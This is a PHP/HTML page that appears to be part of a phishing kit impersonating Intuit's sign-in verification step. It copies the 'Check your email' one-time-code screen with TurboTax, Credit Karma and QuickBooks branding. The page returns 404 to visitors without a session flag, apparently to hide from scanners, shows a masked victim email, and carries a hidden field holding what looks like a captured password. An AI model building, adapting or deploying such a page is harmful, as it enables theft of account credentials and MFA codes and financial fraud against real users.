<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./css/code.css">
   </head>
   <body>
<div id="web-shell-spinner" class="has-background hide-spinner snipcss0-1-1-2">
    <div class="idsTSIShortSpinner IndeterminateShort-wrapper snipcss0-2-2-3">
        <div class="IndeterminateShort-circularSpinnerOuter snipcss0-3-3-4">
            <div class="IndeterminateShort-circularSpinnerInner snipcss0-4-4-5"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit snipcss0-5-5-6" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                    <circle cx="64" cy="64" r="6.9"></circle>
                </svg></div>
        </div>
        <div class="IndeterminateShort-circularSpinnerOuter snipcss0-3-3-7">
            <div class="IndeterminateShort-circularSpinnerInner snipcss0-4-7-8"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit snipcss0-5-8-9" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                    <circle cx="64" cy="64" r="6.9"></circle>
                </svg></div>
        </div>
        <div class="IndeterminateShort-circularSpinnerOuter snipcss0-3-3-10">
            <div class="IndeterminateShort-circularSpinnerInner snipcss0-4-10-11"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit snipcss0-5-11-12" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                    <circle cx="64" cy="64" r="6.9"></circle>
                </svg></div>
        </div>
        <div class="IndeterminateShort-circularSpinnerOuter snipcss0-3-3-13">
            <div class="IndeterminateShort-circularSpinnerInner snipcss0-4-13-14"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit snipcss0-5-14-15" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                    <circle cx="64" cy="64" r="6.9"></circle>
                </svg></div>
        </div>
    </div>
</div>
<div id="___appshell" class="snipcss0-1-1-16">
    <div id="app" class="app-shell snipcss0-2-16-17">
        <div data-theme="intuit" data-colorscheme="light" class="snipcss0-3-17-18">
            <div class="shell-view snipcss0-4-18-19">
                <div class="main snipcss0-5-19-20">
                    <div class="body-container snipcss0-6-20-21">
                        <div class="body snipcss0-7-21-22" data-id="bodyNode" role="main">
                            <div data-testid="SignInSignUpWidget" class="ius-hosted-ui theme-intuit-ecosystem ius-reset snipcss0-8-22-23" data-morpheus-widget="identity-authn-core-ui/sign-in-sign-up-hosted@1.0.0" data-morpheus-pluginid="identity-authn-core-ui">
                                <div class="styledComponents__HostedSisuHeightDiv-sc-1n0nm38-0 ixZFAx snipcss0-9-23-24">
                                    <div class="snipcss0-10-24-25">
                                        <div data-testid="IuxBookendsContainer" class="Bookends__FlexCenteredColumn-sc-163uul4-0 iYjrAf snipcss0-11-25-26">
                                            <div class="BookendsHeader__StyledBookendHeader-sc-1dyhyro-0 bTZsOE snipcss0-12-26-27">
                                                <div data-testid="IuxHeaderLogo" class="IuxHeaderLogo__HeaderLogoContainer-sc-1uo1ya3-0 bGOvWD snipcss0-13-27-28"><a href="#" class="IuxHeaderLogo__StyledAnchor-sc-1uo1ya3-1 kzzJLa snipcss0-14-28-29"></a></div>
                                                <div data-testid="IuxLogosContainer" class="BookendsStaticLogoBar__LogosContainer-sc-1hbi6n-0 IXbTG snipcss0-13-27-30"><a data-testid="IuxProductLogo-turbotax" rel="noopener noreferrer" target="_blank" href="https://turbotax.intuit.com" class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD snipcss0-14-30-31">
                                                        <div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi snipcss0-15-31-32"><img width="18" height="18" src="./images/4901eab9003922483088.svg" alt="turbotax" class="styledComponents__StyledIconImg-sc-1ra6hc4-1 imrNvm snipcss0-16-32-33">
                                                            <div class="BookendsStaticLogoBar__LogoProductNameTextDiv-sc-1hbi6n-1 jLDLhh snipcss0-16-32-34 style-bt4IP" id="style-bt4IP"></div>
                                                        </div>
                                                    </a><a data-testid="IuxProductLogo-creditkarma" rel="noopener noreferrer" target="_blank" href="https://creditkarma.com" class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD snipcss0-14-30-35">
                                                        <div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi snipcss0-15-35-36"><img width="18" height="18" src="./images/e28878c6df2cfc0e37b4.svg" alt="creditkarma" class="styledComponents__StyledIconImg-sc-1ra6hc4-1 imrNvm snipcss0-16-36-37">
                                                            <div class="BookendsStaticLogoBar__LogoProductNameTextDiv-sc-1hbi6n-1 jLDLhh snipcss0-16-36-38 style-sql6Y" id="style-sql6Y"></div>
                                                        </div>
                                                    </a><a data-testid="IuxProductLogo-quickbooks" rel="noopener noreferrer" target="_blank" href="https://quickbooks.intuit.com" class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD snipcss0-14-30-39">
                                                        <div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi snipcss0-15-39-40"><img width="18" height="18" src="./images/8a55fd2040ecaf181e6c.svg" alt="quickbooks" class="styledComponents__StyledIconImg-sc-1ra6hc4-1 imrNvm snipcss0-16-40-41">
                                                            <div class="BookendsStaticLogoBar__LogoProductNameTextDiv-sc-1hbi6n-1 jLDLhh snipcss0-16-40-42 style-YVwZJ" id="style-YVwZJ"></div>
                                                        </div>
                                                    </a></div>
                                            </div>
                                            <div class="Bookends__NonStyledDiv-sc-163uul4-4 hVYhee snipcss0-12-26-43">
                                                <div class="styledComponents__StyledWidgetContainer-kizisb-13 dXZNXp ius snipcss0-13-43-44" data-testid="IuxBookendsHeaderContainer">
                                                    <div class="MfaOtpStyles__StyledContainer-e7rfsj-1 xUWxG">
                                                        <section class="IuxH2AndDescription__StyledSection-j40avf-0 hVIzWf MfaOtpStyles__StyledIuxH2AndDescription-e7rfsj-8 kMDSZv">
                                                            <header>
                                                                <h2 class="IuxH2AndDescription__StyledH2-j40avf-1 fvsQoV Typography-light-242afbc Typography-headline-2-0a55c12" data-testid="VerifyOtpHeader" id="VerifyOtpHeader">Check your email</h2>
                                                                <div data-testid="VerifyOtpWeSentToPrompt" id="VerifyOtpWeSentToPrompt" class="IuxH2AndDescription__StyledDescription-j40avf-2 kAsTtm">Enter the 6-digit code we just sent to</div>
                                                            </header>
                                                        </section>
                                                        <div data-testid="VerifyOtpIdentifier" class="MfaOtpStyles__StyledIdentifierDiv-e7rfsj-4 bmzQUE">s*****1@gmail.com</div>
                                                        <div data-testid="VerifyOtpAdditionalH2Text" class="MfaOtpStyles__StyledDontCloseTabDiv-e7rfsj-3 bvkcms">(Don't close this tab)</div><img src="./images/2a9bfea6627ef593caae.gif" alt="Email" data-testid="StyledImg" class="MfaOtpStyles__StyledImg-e7rfsj-5 gogmvi">
                                                        <form class="IuxForm__StyledForm-sc-10pry6-0 kSwFFj" action="#" autocomplete="on" novalidate="">
                                                            <div data-testid="VerifyOtpField" class="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 hiOEEg">
                                                                <div class="TextField-light-8d9994d idsTSTextField TextField-TextFieldWrapper-ac3dd51 style-DQ2wv" id="style-DQ2wv"><label for="ius-mfa-confirm-code" class="TextField-TFLabelWrapper-5565c4c TextField-TFHasLabel-cdab9c1"><span class="TextField-TFLabelOverride-1f9d70f TextField-size-medium-253d5f0 Typography-light-242afbc Typography-body-3-3b2236f">Verification code </span>
                                                                        <div class="TextField-TFInputWrapper-5ea0f14 TextField-size-medium-253d5f0"><input id="ius-mfa-confirm-code" aria-invalid="false" width="100%" class="idsF TextField-TFInput-5b74f65 TextField-light-8d9994d TextField-TFNoErrorText-e9d7d7f TextField-TFNotDisabled-7206466 TextField-size-medium-253d5f0" type="text" aria-label="Verification code" aria-required="true" autocomplete="off" data-testid="VerifyOtpInput" inputmode="numeric" maxlength="6" name="Verification code" placeholder="" value=""></div>
                                                                    </label>
                                                                    <div class=""></div>
                                                                </div>
                                                                <div class="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 pTmif">&nbsp;</div>
                                                            </div><button type="submit" data-testid="VerifyOtpSubmitButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-primary-7bd5bc4 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840" style=""><span class="Button-label-e0ecc32"><span>Continue</span></span></button><button type="button" data-testid="VerifyOtpCancelLink" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq MfaOtpStyles__StyledIuxLinkButton-e7rfsj-0 iPAMVS Button-disabled-ed60a68" disabled=""><span class="Button-label-e0ecc32"><span>I didn't get an email</span></span></button>
                                                        </form>
                                                    </div>
                                                </div>
                                                <div class="BookendsFooterContainer__FooterOutsideWrapper-sc-3y9p8r-0 eYnqxe snipcss0-13-43-97 snipcss0-13-43-72">
                                                    <footer data-testid="IuxLegalAndCopyrightFooter" class="BookendsFooter__StyledFooter-m32qkh-0 bvulvh snipcss0-14-97-98 snipcss0-14-72-73">
                                                        <div data-testid="IuxLegalLinksSection" class="BookendsLegalPrivacySecurityLinks__LinkContainer-r1xb63-0 jlFOcf snipcss0-15-98-99 snipcss0-15-73-74">
                                                            <ul class="BookendsLegalPrivacySecurityLinks__LinkUnorderedList-r1xb63-1 ikvWbj snipcss0-16-99-100 snipcss0-16-74-75">
                                                                <li class="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-2 fwZxHB snipcss0-17-100-101 snipcss0-17-75-76"><a href="https://www.intuit.com/legal/" target="_blank" rel="noopener" data-testid="IuxLegalLink" class="idsTSLink Link-link-11f6543 Link-light-8c95283 snipcss0-18-101-102 snipcss0-18-76-77"><span class="Typography-light-242afbc Typography-body-4-397be1b Typography-regular-5296945 snipcss0-19-102-103 snipcss0-19-77-78" data-testid="innerLinkText">Legal</span></a></li>
                                                                <li class="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-2 fwZxHB snipcss0-17-100-104 snipcss0-17-75-79"><a href="https://www.intuit.com/privacy/statement/" target="_blank" rel="noopener" data-testid="IuxPrivacyLink" class="idsTSLink Link-link-11f6543 Link-light-8c95283 snipcss0-18-104-105 snipcss0-18-79-80"><span class="Typography-light-242afbc Typography-body-4-397be1b Typography-regular-5296945 snipcss0-19-105-106 snipcss0-19-80-81" data-testid="innerLinkText">Privacy</span></a></li>
                                                                <li class="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-2 fwZxHB snipcss0-17-100-107 snipcss0-17-75-82"><a href="https://security.intuit.com/" target="_blank" rel="noopener" data-testid="IuxSecurityLink" class="idsTSLink Link-link-11f6543 Link-light-8c95283 snipcss0-18-107-108 snipcss0-18-82-83"><span class="Typography-light-242afbc Typography-body-4-397be1b Typography-regular-5296945 snipcss0-19-108-109 snipcss0-19-83-84" data-testid="innerLinkText">Security</span></a></li>
                                                            </ul>
                                                        </div>
                                                        <div data-testid="IuxCopyrightSection" class="snipcss0-15-98-110 snipcss0-15-73-85">
                                                            <div class="BookendsCopyright__FooterText-sc-14acr3j-0 kLZOSk snipcss0-16-110-111 snipcss0-16-85-86">© 2024 Intuit, Inc. All rights reserved. Intuit, QuickBooks, QB, TurboTax, ProConnect, Credit Karma, and Mailchimp are registered trademarks of Intuit Inc.</div>
                                                            <div class="BookendsTerms__FooterText-sc-1t6rken-0 gzTLIx snipcss0-16-110-112 snipcss0-16-85-87">Terms and conditions, features, support, pricing, and service options subject to change without notice.</div>
                                                        </div>
                                                    </footer>
                                                </div>
                                            </div>
                                        </div><input readonly="" type="password" hidden="" data-testid="SignInHiddenInput" id="ius-password" value="@Olamisam9" class="snipcss0-11-25-113 snipcss0-11-25-88"><input readonly="" type="checkbox" hidden="" data-testid="SignInHiddenRememberMe" id="ius-remember" class="snipcss0-11-25-114 snipcss0-11-25-89">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="secondary-widget-renderer" class="snipcss0-7-21-115 snipcss0-7-21-90"></div>
                    </div>
                </div>
            </div>
            <div class="trowser-view snipcss0-4-18-116 snipcss0-4-18-91"></div>
            <div class="portal-view snipcss0-4-18-117 snipcss0-4-18-92" id="portal-root"></div>
        </div>
    </div>
</div></body>
</html>
